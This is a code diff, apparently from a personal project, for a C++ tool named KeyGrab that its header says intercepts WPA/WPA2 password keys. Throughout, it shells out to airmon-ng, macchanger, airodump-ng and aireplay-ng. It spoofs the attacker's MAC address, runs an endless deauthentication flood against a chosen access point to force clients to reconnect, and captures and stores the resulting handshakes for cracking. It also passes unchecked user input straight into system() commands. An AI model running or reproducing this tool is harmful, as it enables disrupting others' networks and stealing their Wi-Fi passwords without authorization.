@@ -1,110 +1,186 @@
+/***********************************************
+*FILENAME:		KeyGrab.cpp 
+*AUTHOR: 		Ryan Sisco
+*REQUIREMENTS:	macchanger & aircrack-ng plugins
+*DATE:			JAN 2017
+*DESCRIPTION:	intercepts WPA/WPA2 password keys
+***********************************************/
+
+
+
 #include <iostream>
 #include <cstdlib>
 #include <string>
 
 using namespace std;
-void clean();
-void randomize();
-void reset_mac();
-void gnome_terminal(string, string);
-void organize(string);
+string get_bssid(string);				//prompts and returns bssid
+string get_channel(string);				//prompts and returns channel
+void clean();							//resets wlan0
+void randomize();						//randomizes mac address
+void reset_mac();						//resets mac address
+void gnome_terminal(string, string);	//opens second terminal and executes deauth
+void organize(string);					//stores Keys in folders
+void closing();							//closes out program with text and spacing
+
+
+
+
 
 int main() {
-	string pause;
-	string dir;
-	string t_mac_a;
-	string answer;
-	string answer2;
-	string answer3;
-	string answer4;
-	string deauth;
-	cout << "Starting..." << endl;
-	system ("airmon-ng start wlan0");
-	randomize();
-	system ("airodump-ng wlan0mon");
-	system("echo \"$(tput setaf 6)$(tput bold)$(tput smul)Target MAC Address:$(tput bold)$(tput smul)$(tput sgr 0)\"");
-	cin >> answer;
-	if (answer == "quit" || answer == "exit") {
-		return 0;
-	}
-	dir = "mkdir ";
-	dir += answer;
+	string dir, t_mac_a, bssid, channel, deauth;
+	bssid = get_bssid(bssid); 
+	channel = get_channel(channel);
+	dir = "mkdir " + bssid;
 	system(dir.c_str());
-	system("echo \"$(tput setaf 6)$(tput bold)$(tput smul)Channel:$(tput sgr 0)\"");
-	cin >> answer2;
-	system("airmon-ng stop wlan0mon");
-	t_mac_a = "airmon-ng start wlan0 ";
-	t_mac_a += answer2;
+	t_mac_a = "airmon-ng start wlan0 " + channel;
 	system(t_mac_a.c_str());
 	randomize();
-	//
-	gnome_terminal(answer, answer2);
-	//
-
-	deauth = "aireplay-ng -0 0 -a ";
-	deauth += answer;
-	deauth += " wlan0mon";
+	gnome_terminal(bssid, channel);
+	deauth = "aireplay-ng -0 0 -a " + bssid + " wlan0mon";
 	system(deauth.c_str());
-	cout << endl;
-	cout << endl;
-	cout << endl;
-	cout << endl;
-	system("echo \"$(tput bold)$(tput smul)$(tput setaf 6)Cleaning:$(tput sgr 0)\"");
-	system("cd ..");
-	//
-	organize(answer);
-	//
+	closing();
+	organize(bssid);
 	reset_mac();
 	clean();
 }
 
+
+
+
+
+/***********************************************
+*FUNCTION:     clean
+*RETURNS:	   nothing
+*DESCRIPTION:  stops monitor mode and restarts  
+*              network manager
+***********************************************/
 void clean() {
-	
 	system("airmon-ng stop wlan0mon");
 	system("sudo service network-manager restart");
 	system("ifconfig wlan0 up");
 }
 
+
+
+
+
+/***********************************************
+*FUNCTION:     randomize
+*RETURNS:	   nothing
+*DESCRIPTION:  randomizes local MAC address  
+*              
+***********************************************/
 void randomize() {
 	system("ifconfig wlan0mon down");
 	system("macchanger -a wlan0mon");
 	system("ifconfig wlan0mon up");
 }
 
+
+
+
+
+/***********************************************
+*FUNCTION:     reset_mac
+*RETURNS:	   nothing
+*DESCRIPTION:  resets local MAC address  
+*              
+***********************************************/
 void reset_mac() {
 	system("ifconfig wlan0mon down");
 	system("macchanger -p wlan0mon");
 	system("ifconfig wlan0mon up");
 }
 
+
+
+
+
+/***********************************************
+*FUNCTION:     gnome_terminal
+*RETURNS:	   nothing
+*DESCRIPTION:  creates a new window and enters  
+*              deauth in that window
+***********************************************/
 void gnome_terminal(string mac, string ch) {
 	string t_mac_a;
-	t_mac_a = "gnome-terminal -x sh -c "; 
-	t_mac_a += "\""; 
-	t_mac_a += "airodump-ng -c";
-	t_mac_a += ch;
-	t_mac_a += " -w Key --bssid ";
-	t_mac_a += mac;
-	t_mac_a += " wlan0mon; bash \"";
+	t_mac_a = "gnome-terminal -x sh -c \" airodump-ng -c" + ch; 
+	t_mac_a += " -w Key --bssid " + mac + " wlan0mon; bash\"";
 	system(t_mac_a.c_str());
 }
 
+
+
+
+
+/***********************************************
+*FUNCTION:     organize
+*RETURNS:	   nothing
+*DESCRIPTION:  creates folders and stores keys  
+*              based on bssid
+***********************************************/
 void organize(string mac) {
 	string dir;
-	dir = "mv Key-01.cap /root/Scripts/KeyGrab/";
-	dir += mac;
-	dir += "/";
+	dir = "mv Key-01.cap /root/Scripts/KeyGrab/" + mac + "/";
 	system(dir.c_str());
-	dir = "mv Key-01.csv /root/Scripts/KeyGrab/";
-	dir += mac;
-	dir += "/";
+	dir = "mv Key-01.csv /root/Scripts/KeyGrab/" + mac + "/";
 	system(dir.c_str());
-	dir = "mv Key-01.kismet.csv /root/Scripts/KeyGrab/";
-	dir += mac;
-	dir += "/";
+	dir = "mv Key-01.kismet.csv /root/Scripts/KeyGrab/" + mac + "/";
 	system(dir.c_str());
-	dir = "mv Key-01.kismet.netxml /root/Scripts/KeyGrab/";
-	dir += mac;
-	dir += "/";
+	dir = "mv Key-01.kismet.netxml /root/Scripts/KeyGrab/" + mac + "/";
 	system(dir.c_str());
+}
+
+
+
+
+
+/***********************************************
+*FUNCTION:     get_bssid
+*RETURNS:	   bbsid
+*DESCRIPTION:  randomizes MAC, enters monitor mode,
+*			   prompts for bssid, returns it               
+***********************************************/
+string get_bssid(string bssid) {
+	cout << "Starting..." << endl;
+	system ("airmon-ng start wlan0");
+	randomize();
+	system ("airodump-ng wlan0mon");
+	system("echo \"$(tput setaf 6)$(tput bold)$(tput smul)Target MAC Address:$(tput bold)$(tput smul)$(tput sgr 0)\"");
+	cin >> bssid;
+	return bssid;
+}
+
+
+
+
+
+/***********************************************
+*FUNCTION:     get_channel
+*RETURNS:	   channel number (string)
+*DESCRIPTION:  prompts for channel and stops  
+*              monitor mode
+***********************************************/
+string get_channel(string channel) {
+	
+	system("echo \"$(tput setaf 6)$(tput bold)$(tput smul)Channel:$(tput sgr 0)\"");
+	cin >> channel;
+	system("airmon-ng stop wlan0mon");
+	return channel;
+}
+
+
+
+
+
+/***********************************************
+*FUNCTION:     closing
+*RETURNS:	   nothing
+*DESCRIPTION:  enters spacing and prints closing  
+*              line
+***********************************************/
+void closing() {
+	cout << string(5,'\n');
+	system("echo \"$(tput bold)$(tput smul)$(tput setaf 6)Cleaning:$(tput sgr 0)\"");
+	system("cd ..");
 }
